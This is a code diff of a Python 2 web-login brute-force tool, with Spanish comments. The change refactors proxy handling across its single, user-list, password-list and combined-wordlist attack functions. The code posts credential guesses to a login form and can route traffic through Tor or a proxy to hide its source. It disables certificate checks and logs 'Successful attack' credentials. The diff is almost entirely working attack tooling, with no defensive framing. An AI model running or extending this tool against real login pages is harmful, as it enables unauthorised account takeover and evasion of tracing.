@@ -10,13 +10,16 @@ import re # Utilizado para regex
 import socket # Tor
 import socks # Tor
 
-def check(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,tor,report):
+def check(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxip,proxport,tor,report):
 	b = ['','1','12']
 	a = []
+	
+	proxy = proxip  + ':' + proxport
+	proxies = {'http' : proxy, 'https' : proxy,}
 	print colored("\nBeginning BruteForce", 'yellow')
 	
 	requests.packages.urllib3.disable_warnings()
-	if len(proxip) == 0:
+	if len(proxy) == 1:
 		if tor == True:  # Peticiones a traves de tor
 			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
 			socket.socket = socks.socksocket
@@ -25,9 +28,10 @@ def check(url, userField, passField, user, pwd, userFile, pwdFile, message,verbo
 		else:
 			req = requests.get(url,verify=False)
 	else: # Peticiones a traves de proxy
-		proxy = proxip  + ':' + proxport
-		proxies = {'http' : proxy, 'https' : proxy,}
-		req = requests.get(url,proxies = {'http':proxy},verify=False)
+		try:
+			req = requests.get(url,proxies = proxies,verify=False)
+		except requests.exceptions.ConnectionError:
+			sys.exit(2)
 	
 	if cookie is None: # Obtencion de la cookie de sesion
 		for key,value in req.headers.iteritems():
@@ -60,7 +64,7 @@ def check(url, userField, passField, user, pwd, userFile, pwdFile, message,verbo
 		payload = {userField : element, passField: ''}
 		headers = {'user-agent': agent}
 		cookies = {'': cookie} 
-		if len(proxip) == 0:
+		if len(proxy) == 1:
 			if tor == True:
 				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
 				socket.socket = socks.socksocket
@@ -69,21 +73,19 @@ def check(url, userField, passField, user, pwd, userFile, pwdFile, message,verbo
 			else:
 				r = requests.post(url, payload,cookies = cookies, headers = headers, verify=False)
 		else:
-			proxy = proxip  + ':' + proxport
-			proxies = {'http' : proxy, 'https' : proxy,}
-			r = requests.post(url,payload,cookies = cookies, headers = headers,proxies = {'http':proxy},verify=False)
+			r = requests.post(url,payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
 		a.append(len(r.content))
 	
 	if len(userFile) == 0 and len(pwdFile) == 0 and len(user) > 0 and len(pwd) > 0 : # Sin archivos
-		single(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a,tor,report)
+		single(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxy,proxies,a,tor,report)
 	elif len(user) == 0 and len(pwd) == 0 and len(userFile) > 0 and len(pwdFile) > 0: # Ambos archvios
-		doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a,tor,report)
+		doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxy,proxies,a,tor,report)
 	elif len(user) == 0 and len(pwdFile) == 0 and len(pwd) > 0 and len(userFile) > 0: # Archivo de usuarios
-		usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a,tor,report)
+		usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxy,proxies,a,tor,report)
 	elif len(pwd) == 0 and len(userFile) == 0 and len(user) > 0 and len(pwdFile) > 0: # Archivo de passwords
-		passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a,tor,report)
+		passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxy,proxies,a,tor,report)
 		
-def single(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxip,proxport,list,tor,report):
+def single(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxy,proxies,list,tor,report):
 	l = []
 	mbefore = message
 	requests.packages.urllib3.disable_warnings()		
@@ -92,7 +94,7 @@ def single(url, userField, passField, user, pwd, userFile, pwdFile, message,verb
 	
 	headers = {'user-agent': agent}
 	cookies = {'': cookie} 
-	if len(proxip) == 0:
+	if len(proxy) == 1:
 		if tor == True:
 			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
 			socket.socket = socks.socksocket
@@ -101,9 +103,7 @@ def single(url, userField, passField, user, pwd, userFile, pwdFile, message,verb
 		else:
 			r = requests.post(url, payload,cookies = cookies, headers = headers, verify=False)
 	else:
-		proxy = proxip  + ':' + proxport
-		proxies = {'http' : proxy, 'https' : proxy,}
-		r = requests.post(url,payload,cookies = cookies, headers = headers,proxies = {'http':proxy},verify=False)
+		r = requests.post(url,payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
 	
 	if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
 		if int(len(r.content)) - int(len(user)) == list[0] and mbefore in r.content:
@@ -172,7 +172,7 @@ def single(url, userField, passField, user, pwd, userFile, pwdFile, message,verb
 		
 	rep(report,l)
 		
-def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxip,proxport,list,tor,report):
+def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxy,proxies,list,tor,report):
 	l = []
 	users = []
 	requests.packages.urllib3.disable_warnings()		
@@ -191,7 +191,7 @@ def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,v
 			payload = { userField : users[i].rstrip('\n'), passField: pwd} # Carga del payload
 			headers = {'user-agent': agent}
 			cookies = {'': cookie} 
-			if len(proxip) == 0:
+			if len(proxy) == 1:
 				if tor == True:
 					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
 					socket.socket = socks.socksocket
@@ -200,9 +200,7 @@ def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,v
 				else:
 					r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
 			else:
-				proxy = proxip  + ':' + proxport
-				proxies = {'http' : proxy, 'https' : proxy,}
-				r = requests.post(url,data = payload, cookies = cookies, headers = headers, proxies = {'http':proxy},verify=False)
+				r = requests.post(url,data = payload, cookies = cookies, headers = headers, proxies = proxies,verify=False)
 				
 			if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
 				if int(len(r.content)) - int(len(users[i])-1) == list[0] and mbefore in r.content:
@@ -271,7 +269,7 @@ def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,v
 						l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
 	rep(report,l)
 
-def passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,list,tor,report):
+def passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxy,proxies,list,tor,report):
 	l = []
 	passwords = []
 	requests.packages.urllib3.disable_warnings()		
@@ -290,7 +288,7 @@ def passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,ve
 			payload = { userField : user, passField: passwords[i].rstrip('\n')} # Carga de payload
 			headers = {'user-agent': agent}
 			cookies = {'': cookie} 
-			if len(proxip) == 0:
+			if len(proxy) == 1:
 				if tor == True:
 					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
 					socket.socket = socks.socksocket
@@ -299,9 +297,7 @@ def passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,ve
 				else:
 					r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
 			else:
-				proxy = proxip  + ':' + proxport
-				proxies = {'http' : proxy, 'https' : proxy,}
-				r = requests.post(url,data = payload,cookies = cookies, headers = headers,proxies = {'http':proxy},verify=False)
+				r = requests.post(url,data = payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
 				
 			if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
 				if int(len(r.content)) - int(len(user)) == list[0] and mbefore in r.content:
@@ -370,7 +366,7 @@ def passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,ve
 						l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
 	rep(report, l)
 	
-def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,list,tor,report): # Ambos archivos
+def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxy,proxies,list,tor,report): # Ambos archivos
 	l = []
 	users = []
 	passwords = []
@@ -401,7 +397,7 @@ def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,
 				payload = { userField : users[i].rstrip('\n'), passField: passwords[j].rstrip('\n')}
 				headers = {'user-agent': agent}
 				cookies = {'': cookie} 
-				if len(proxip) == 0:
+				if len(proxy) == 1:
 					if tor == True:
 						socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
 						socket.socket = socks.socksocket
@@ -410,9 +406,7 @@ def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,
 					else:
 						r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
 				else:
-					proxy = proxip  + ':' + proxport
-					proxies = {'http' : proxy, 'https' : proxy,}
-					r = requests.post(url,data = payload,cookies = cookies, headers = headers,proxies = {'http':proxy},verify=False)
+					r = requests.post(url,data = payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
 					
 				if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
 					if int(len(r.content)) - int(len(users[i])-1) == list[0] and mbefore in r.content:
